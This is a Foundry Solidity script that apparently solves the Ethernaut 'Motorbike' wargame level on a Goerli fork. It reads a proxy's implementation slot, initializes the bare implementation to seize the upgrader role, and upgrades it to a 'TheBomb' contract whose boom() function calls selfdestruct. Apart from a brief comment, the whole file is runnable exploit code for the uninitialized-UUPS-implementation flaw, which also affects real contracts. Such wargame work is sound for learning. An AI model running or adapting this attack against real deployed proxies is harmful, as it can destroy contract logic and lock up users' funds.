// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;

import "forge-std/Script.sol";
import "../src/Motorbike.sol";

// instance addr: 0xe02891A015C3654Aedf70019C66f2CC0309F2675
// anvil -f $GOERLI_RPC_URL --fork-block-number 8494999 
// forge script script/Motorbike.s.sol:MotorbikeSolution --fork-url http://127.0.0.1:8545 --broadcast -vvv
// forge script script/Motorbike.s.sol:MotorbikeSolution --rpc-url $GOERLI_RPC_URL --broadcast -vvv

contract MotorbikeSolution is Script {
    address public constant INSTANCE_ADDR = 0xe02891A015C3654Aedf70019C66f2CC0309F2675;
    bytes32 public constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {}

    /*
     * The engine is initialized via the proxy so it is not properly initialized.
     * We can call its initialize function without proxy and be the upgrader.
     */
    function run() public {
        //uint256 attackerPK = vm.envUint("ANVIL_PRIVATE_KEY");
        uint256 attackerPK = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(attackerPK);

        // Read implementation address 
        address implementationAddr = address(uint160(uint256(vm.load(INSTANCE_ADDR, IMPLEMENTATION_SLOT))));
        console.log("Implementation Addr: ", implementationAddr);

        // Be sure storage variables are uninitialized
        Engine engine = Engine(implementationAddr);
        assert(engine.horsePower() == 0);
        assert(engine.upgrader() == address(0x0));

        // Deploy selfdestruct contract 
        TheBomb bomb = new TheBomb(vm.addr(attackerPK));

        // initialize engine
        engine.initialize();
        
        // call upgrateToAndCall with bomb function selecter as data parameter
        bytes memory data = abi.encodeWithSelector(bomb.boom.selector);
        engine.upgradeToAndCall(address(bomb), data);

        vm.stopBroadcast();
    }
}

contract TheBomb {
    address public attackerAddr;
    
    constructor(address _attackerAddr) public {
        attackerAddr = _attackerAddr;
    }

    function boom() external {
        selfdestruct(payable(attackerAddr));
    }
}